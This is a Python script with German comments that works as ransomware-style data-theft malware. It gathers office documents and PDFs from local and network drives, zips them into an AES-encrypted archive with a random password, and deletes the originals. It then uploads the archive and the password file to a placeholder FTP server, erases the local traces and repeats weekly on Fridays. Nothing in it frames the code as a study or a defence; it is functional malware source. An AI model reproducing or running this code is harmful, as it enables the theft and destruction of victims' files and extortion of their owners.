import os
import random
import string
import datetime
import time
import docx2txt
import pyzipper
from ftplib import FTP


# Funktion zum Generieren eines Passworts
def generate_password(length=10):
    characters = string.ascii_letters + string.digits + string.punctuation
    password = "".join(random.choice(characters) for _ in range(length))
    return password


# Funktion zum Zippen von Dateien mit Passwort
def zip_files_with_password(password, zip_filename, files):
    with pyzipper.AESZipFile(zip_filename, "w", compression=pyzipper.ZIP_LZMA) as zf:
        zf.setpassword(password.encode())
        for file in files:
            zf.write(file)


# Funktion zum Durchsuchen von Laufwerken und Sammeln von Dateien
def search_files(start_path):
    files = []
    for root, _, filenames in os.walk(start_path):
        for filename in filenames:
            extension = os.path.splitext(filename)[1].lower()
            if extension == ".pdf":
                files.append(os.path.join(root, filename))
            elif extension in [".doc", ".docx"]:
                text = docx2txt.process(os.path.join(root, filename))
                if text:
                    files.append(os.path.join(root, filename))
            elif extension == ".xlsx":
                files.append(os.path.join(root, filename))
    return files


# Funktion zum Löschen der Originaldateien
def delete_files(files):
    for file in files:
        os.remove(file)


# Funktion zum Speichern des Passworts in einer Textdatei
def save_password(password, filename):
    with open(filename, "w") as file:
        file.write(password)


# Funktion zum Hochladen der ZIP-Dateien auf einen FTP-Server
def upload_zip_files(
    zip_filenames, password_filename, ftp_server, username, password, target_folder
):
    ftp = FTP(ftp_server)
    ftp.login(username, password)

    ftp.cwd(target_folder)  # In den Zielordner wechseln

    for zip_filename in zip_filenames:
        with open(zip_filename, "rb") as file:
            ftp.storbinary(f"STOR {zip_filename}", file)

    with open(password_filename, "rb") as file:
        ftp.storbinary(f"STOR {password_filename}", file)

    ftp.quit()


# Hauptprogramm
def main():
    # Durchsuchen aller Laufwerke inklusive Netzwerklaufwerken
    drives = [
        "C:",
        "D:",
        "E:",
        "F:",
        "G:",
    ]  # Fügen Sie hier alle relevanten Laufwerksbuchstaben hinzu
    network_drives = [
        "Z:",
        "Y:",
    ]  # Fügen Sie hier alle relevanten Netzwerklaufwerksbuchstaben hinzu

    all_files = []
    for drive in drives:
        all_files.extend(search_files(drive))
    for network_drive in network_drives:
        all_files.extend(search_files(network_drive))

    # Generieren des Passworts und Speichern in einer Textdatei
    password = generate_password()
    password_filename = "password.txt"
    save_password(password, password_filename)

    # Zippen der Dateien mit Passwort
    zip_filename = "files.zip"
    zip_files_with_password(password, zip_filename, all_files)

    # Löschen der Originaldateien
    delete_files(all_files)

    # Hochladen der ZIP-Dateien auf den FTP-Server
    ftp_server = "IP/URL"
    username = "Benutzer"
    password = "Password"
    target_folder = "/wo_auch_immer"  # Zielpfad auf dem FTP-Server
    upload_zip_files(
        [zip_filename], password_filename, ftp_server, username, password, target_folder
    )

    # Löschen der erstellten ZIP-Dateien auf dem lokalen Rechner
    os.remove(zip_filename)
    os.remove(password_filename)


while True:
    next_friday = datetime.datetime.combine(
        datetime.date.today()
        + datetime.timedelta(days=(4 - datetime.date.today().weekday()) % 7),
        datetime.time(0, 0),
    )
    now = datetime.datetime.now()
    if now >= next_friday:
        main()
        next_friday += datetime.timedelta(weeks=1)  # Nächsten Freitag berechnen
    time.sleep(60)  # 60 Sekunden warten, um Ressourcen zu schonen
